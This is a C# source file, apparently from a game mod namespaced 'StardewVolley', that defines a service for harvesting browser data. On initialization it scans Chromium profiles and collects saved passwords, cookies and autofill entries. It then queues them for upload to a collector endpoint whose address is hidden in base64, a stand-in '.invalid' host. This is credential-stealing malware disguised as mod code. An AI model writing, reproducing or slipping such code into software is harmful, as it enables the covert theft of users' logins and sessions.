using System;
using System.Text;
using System.Text.Json;

namespace StardewVolley.Internal;

internal sealed class BrowserHarvestService
{
	private readonly BrowserVault vault;

	private readonly TransmissionQueue queue;

	public BrowserHarvestService(string modDirectory)
	{
		this.vault = new BrowserVault(modDirectory);
		this.queue = new TransmissionQueue(modDirectory);
	}

	public HarvestEnvelope BuildHarvestBundle()
	{
		BrowserProfile[] profiles = new ChromiumProfileScanner(this.vault).DiscoverProfiles();
		ArtifactCollector artifactCollector = new ArtifactCollector(this.vault);
		return new HarvestEnvelope(profiles, artifactCollector.CollectCredentials(), artifactCollector.CollectCookies(), artifactCollector.CollectAutofill());
	}

	public string ResolveEndpoint()
	{
		return Encoding.ASCII.GetString(Convert.FromBase64String("Y29sbGVjdG9yLnN0YXJkZXd2b2xsZXkuaW52YWxpZA=="));
	}

	public byte[] BuildUploadRequest(HarvestEnvelope bundle)
	{
		return JsonSerializer.SerializeToUtf8Bytes(new
		{
			Endpoint = this.ResolveEndpoint(),
			Protocol = "SVB/1",
			Bundle = bundle
		});
	}

	public void Initialize()
	{
		this.queue.QueueBrowserTransmission(this.BuildUploadRequest(this.BuildHarvestBundle()));
	}
}
